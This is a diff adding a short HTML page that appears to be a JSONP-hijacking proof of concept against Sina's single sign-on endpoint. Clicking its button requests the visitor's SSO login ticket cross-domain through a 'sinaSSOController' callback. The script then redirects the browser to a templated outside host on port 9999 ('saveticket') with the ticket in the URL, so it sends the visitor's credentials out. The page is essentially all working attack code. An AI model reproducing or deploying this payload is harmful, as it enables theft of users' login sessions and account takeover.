@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="http://www.w3school.com.cn/jquery/jquery-1.11.1.min.js"></script>
+    <script>
+
+        function sinaSSOController(data){
+            var result = JSON.stringify(data); //json对象转成字符串
+            $("#text").val(result);
+			console.log(1);
+			var url="http://{{host}}:9999/saveticket/?msg="+result;
+			document.location=url;
+
+        }
+
+        $(document).ready(function () {
+
+            $("#btn").click(function () {
+
+                $.ajax({
+                    url: "http://login.sina.com.cn/sso/login.php?entry=wbwidget&service=miniblog&encoding=UTF-8&gateway=1&returntype=TEXT&from=",
+                    type: "GET",
+                    dataType: "jsonp", //指定服务器返回的数据类型
+                    jsonpCallback: "sinaSSOController",
+                    success: function (data) {
+                        var result = JSON.stringify(data); //json对象转成字符串
+                        $("#text").val(result);
+						console.log(1);
+						var url="http://{{host}}:9999/saveticket/?msg="+result;
+						document.location=url;
+
+                    }
+                });
+
+            });
+
+        });
+    </script>
+</head>
+<body>
+    <input id="btn" type="button" value="跨域获取数据" />
+    <textarea id="text" style="width: 400px; height: 100px;"></textarea>
+
+</body>
+</html>
